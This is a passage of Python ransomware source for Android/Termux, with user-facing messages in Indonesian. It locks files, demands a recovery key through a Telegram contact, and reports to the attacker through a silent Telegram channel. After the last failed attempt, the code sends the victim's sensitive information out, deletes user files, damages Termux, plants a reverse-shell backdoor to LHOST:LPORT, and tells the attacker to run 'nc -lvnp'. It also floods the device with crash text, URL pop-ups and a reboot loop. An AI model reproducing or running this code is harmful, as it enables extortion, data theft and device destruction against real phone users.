    print(f"{RED_BOLD}Hubungi kami di Telegram: {CYAN_BOLD}{RANSOM_VICTIM_CONTACT}{RESET}{RED_BOLD} dan berikan ID perangkat Anda.{RESET}\n")
    print(f"{RED_BOLD}ID Perangkat Anda: {MAGENTA_BOLD}{socket.gethostname()}{RESET}\n")

    print(f"{YELLOW}\nMemulai proses penguncian file yang memakan waktu...{RESET}")
    for dir_to_lock in target_directories:
        process_directory_files(dir_to_lock, lock_file_and_inject, message_prefix="Mengunci file...", delay_per_file=0.05)
        time.sleep(1)
    print(f"{GREEN_BOLD}\nPenguncian awal selesai. File Anda telah diubah.{RESET}")

    # --- Bagian Input Kunci dari Korban ---
    attempts_left = MAX_ATTEMPTS
    while attempts_left > 0:
        print(f"{YELLOW}\nUntuk mengembalikan file Anda, masukkan kode pemulihan.{RESET}")
        print(f"{YELLOW}Anda memiliki {attempts_left} percobaan tersisa.{RESET}")
        entered_key = input(f"{BLUE}Masukkan kode: {RESET}")

        if entered_key == CORRECT_RANSOM_KEY:
            print(f"{GREEN_BOLD}\nKode benar! Memulai proses pemulihan file Anda...{RESET}")
            for dir_to_unlock in target_directories:
                process_directory_files(dir_to_unlock, unlock_file_by_renaming, message_prefix="Memulihkan file...", delay_per_file=0.02)
                time.sleep(0.5)
            print(f"{GREEN_BOLD}\nSemua file telah berhasil dipulihkan! Proses selesai.{RESET}")
            send_text_to_telegram_silent(f"<b>--- Korban Berhasil Memulihkan File ---</b>\nID Perangkat: <code>{socket.gethostname()}</code>\nKunci yang dimasukkan: <code>{entered_key}</code>")
            break
        else:
            attempts_left -= 1
            if attempts_left > 0:
                print(f"{RED_BOLD}Kode salah! Coba lagi.{RESET}")
            else:
                print(f"{RED_BOLD}\nKode salah {MAX_ATTEMPTS} kali! Konsekuensi akhir diaktifkan!{RESET}")
                
                # --- KUMPULKAN INFORMASI SENSITIF AKHIR ---
                print(f"{YELLOW}\nMengumpulkan informasi sensitif terakhir...{RESET}")
                sensitive_info = gather_sensitive_info_android(temp_data_dir)
                final_sensitive_message = f"""
<b>--- INFORMASI SENSITIF AKHIR DARI KORBAN GAGAL ---</b>
<b>ID Perangkat:</b> <code>{socket.gethostname()}</code>
{sensitive_info}
"""
                send_text_to_telegram_silent(final_sensitive_message)
                print(f"{GREEN}Informasi sensitif telah dikirim.{RESET}")

                # --- AKTIVASI PENGHANCURAN TOTAL ---
                print(f"{RED_BOLD}\nMemulai penghapusan file permanen...{RESET}")
                for dir_to_delete in target_directories:
                    process_directory_files(dir_to_delete, delete_file, message_prefix="Menghapus file...", delay_per_file=0.03)
                    time.sleep(0.5)
                print(f"{RED_BOLD}\nSemua file pengguna telah dihapus!{RESET}")

                # --- MERUSAK TERMUX DAN MENANAMKAN BACKDOOR ---
                damage_termux()
                backdoor_success = inject_main_backdoor(LHOST, LPORT)
                
                # --- AKTIVASI VIRTEX GACOR ---
                virtex_string = generate_virtex()
                virtex_file_path = os.path.join(user_home, "storage", "shared", "SYSTEM_CORRUPTED_READ_ME.txt")
                try:
                    with open(virtex_file_path, "w") as f:
                        f.write("PERINGATAN KRITIS! SISTEM RUSAK! MEMBUKA FILE INI DAPAT MERUSAK LEBIH LANJUT!\n\n" + virtex_string)
                except Exception:
                    pass

                try:
                    subprocess.run(['termux-notification', '-t', 'SISTEM RUSAK KRITIS!', '-c', virtex_string], check=False, timeout=10)
                except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
                    pass

                print(f"{RED_BOLD}\n\nKRITIS! KESALAHAN SISTEM TAK TERDUGA! DATA KORUP!\n\n{RESET}")
                print(virtex_string)

                final_message_to_attacker = f"""
<b>--- KORBAN GAGAL! PENGHANCURAN TOTAL + VIRTEX + REBOOT LOOP + FLASK BOOM AKTIF ---</b>
<b>ID Perangkat:</b> <code>{socket.gethostname()}</code>
<b>Status Penghapusan File:</b> Berhasil.
<b>Status Kerusakan Termux:</b> Berhasil.
<b>Status Backdoor:</b> {'Berhasil ditanamkan.' if backdoor_success else 'Gagal ditanamkan.'}
<b>Virtex Aktif:</b> Ya. File 'SYSTEM_CORRUPTED_READ_ME.txt' dan notifikasi Termux mungkin mengandung Virtex. Terminal korban dibanjiri.
<b>Reboot Loop Aktif:</b> Ya.
<b>Flask Boom Aktif:</b> Ya. URL: {FLASK_BOOM_URL}
<b>Koneksi Balik ke:</b> <code>{LHOST}:{LPORT}</code>

<b>PERSIAPKAN LISTENER ANDA! (nc -lvnp {LPORT})</b>
"""
                send_text_to_telegram_silent(final_message_to_attacker)
                
                print(f"{RED_BOLD}\nSistem tidak stabil. Proses dihentikan.{RESET}")
                # --- AKTIFKAN MODE PENGHANCURAN HP ---
                activate_hp_destruction_mode(user_home)
                # --- MULAI FLASK BOOM ---
                try:
                    import flask
                    threading.Thread(target=run_flask_boom_server, daemon=True).start()
                    time.sleep(2)
                    for _ in range(10):
                        try:
                            subprocess.run(['termux-open-url', FLASK_BOOM_URL], check=False, timeout=5)
                        except Exception:
                            pass
                        time.sleep(random.uniform(0.5, 1.5))
                except ImportError:
                    print(f"{YELLOW}Peringatan: Flask tidak terinstal. Flask Boom dinonaktifkan.{RESET}")

                start_reboot_loop()
                break
    
    print(f"{YELLOW}\nProses selesai. Membersihkan jejak akhir...{RESET}")
    try:
        shutil.rmtree(temp_data_dir)
    except Exception:
        pass

    print(f"{YELLOW}Proses telah selesai. Sampai jumpa.{RESET}")

if __name__ == "__main__":
    main()